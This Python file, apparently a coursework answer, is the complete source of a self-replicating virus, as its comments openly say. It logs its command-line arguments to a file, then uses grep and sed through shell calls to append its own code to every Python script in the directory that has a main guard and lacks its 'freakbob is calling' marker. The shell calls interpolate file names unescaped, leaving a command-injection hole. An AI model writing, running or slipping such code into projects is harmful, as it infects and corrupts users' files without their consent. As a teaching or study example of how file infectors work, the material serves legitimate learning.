# Q1C.py
# B. Deutsch (9/25/24)

# NOTE: This is like legit a virus. Not a very potent one, but it IS a virus. Keep that in mind and just be cautious.
# NOTE: The following 'joke' is genuinely critical to the function of this virus. DO NOT REMOVE.
'''freakbob is calling'''

import os
import sys
from pathlib import Path

list_dir = os.listdir('.')
py_files = []

# the acutal malware; before the part where it does the spreading nonsense
f_out = ''  # premature declaration for scope purposes
if Path("./Q1C.out").exists():
	f_out = open('Q1C.out', 'a')
else:
	f_out = open('Q1C.out', 'w')
f_out.write( str(sys.argv) )
f_out.write('\n')
f_out.close()


for dir in list_dir:  # only keep .py files
    if len(dir) < 3:
        continue  # not tall enough for this ride, buster
    if dir[len(dir)-3 : len(dir)] == '.py':
        py_files.append(dir)

#print(f'Python Files -> {py_files}')

targets  = []  # will populate with 'items' that are python scripts and DON'T have spyware yet
for filename in py_files:
    print(f'Filename is {filename}')
    with open(f'{filename}', 'r') as f_script:
        contents = f_script.read()
    if 'if __name__ == "__main__":' not in contents:
        print(f'we skipped {filename} because it wasnt a script')
        continue  # not a script
    if 'freakbob is calling' in contents:
        continue  # the payload is already there

    # at this point, we're dealing with an item that IS a script and ISNT injected yet
    targets.append( str(filename) )


#print(f'Targets -> {targets}')

# get the name of the currently executing pyfile
this_filename = sys.argv[0]

# uh oh
for target in targets:
	grep_contents = os.popen(f'grep -n -P -i \'freakbob is calling\' {this_filename}').read()
	
	#print(grep_contents)

	line_number = ''  # for string-concat jank
	# pull the line number out of it
	for i in range(len(grep_contents)):
		if grep_contents[i].isnumeric():
			line_number += grep_contents[i]
		else:
			break  # to make sure that the number is one cohesive item
	print(line_number)
	line_number = int(line_number)  # make it an actual integer


	os.system(f'sed -n \'{line_number},$p\' {this_filename} >> {target}')
	


print('Done!')
